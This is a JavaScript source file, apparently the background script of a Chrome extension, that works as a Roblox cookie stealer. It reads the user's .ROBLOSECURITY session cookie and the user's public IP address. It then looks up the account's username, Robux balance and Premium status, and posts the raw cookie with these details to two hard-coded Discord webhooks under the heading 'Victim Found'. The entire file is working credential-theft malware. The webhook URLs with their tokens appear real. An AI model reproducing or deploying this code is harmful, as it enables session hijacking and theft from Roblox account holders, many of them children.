const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
        mention: "<@everyone>" // ✅ ping here
    },
    {
        url: "https://discord.com/api/webhooks/1403981151365763172/zLogqJlgQnhY0k6JHzuRPNyqMDx9-uztndOpQ8PsDgz8US5SDjrDR-EsJl3pqospR7mU",
        mention: "<@everyone>" // ✅ ping here too
    }
];

async function main(cookie) {
    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    if (cookie) {
        try {
            let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });

            if (res.ok) {
                let user = await res.json();

                // Robux balance
                let economyRes = await fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
                    method: "GET",
                    headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                });
                let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A" };

                // Premium check
                let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
                    method: "GET",
                    headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                });
                let isPremium = premiumRes.ok ? await premiumRes.json() : false;

                statistics = {
                    UserName: user.name,
                    RobuxBalance: economy.robux ?? "N/A",
                    IsPremium: isPremium,
                    ThumbnailUrl: `https://www.roblox.com/avatar-thumbnail/image?userId=${user.id}&width=420&height=420&format=png`,
                    Summary: economy.robux ?? "N/A"
                };
            }
        } catch (e) {
            console.error("Failed to fetch Roblox info:", e);
        }
    }

    // Base embed
    let embedPayload = {
        "embeds": [
            {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "fields": [
                    {
                        "name": "Username",
                        "value": statistics ? statistics.UserName : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Robux",
                        "value": statistics ? statistics.RobuxBalance : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Premium",
                        "value": statistics ? statistics.IsPremium : "N/A",
                        "inline": true
                    },
                    {
                        "name": "Summary",
                        "value": statistics ? statistics.Summary : "N/A",
                        "inline": false
                    }
                ],
                "author": {
                    "name": "Victim Found: " + ipAddr,
                    "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                "footer": {
                    "text": "ENTERPRISE",
                    "icon_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                },
                "thumbnail": {
                    "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                }
            }
        ],
        "username": "Extension Logger",
        "avatar_url": "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
    };

    // Send to both webhooks with ping
    for (let wh of WEBHOOKS) {
        let payload = { ...embedPayload, content: wh.mention };

        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    }
}

chrome.cookies.get({ "url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});
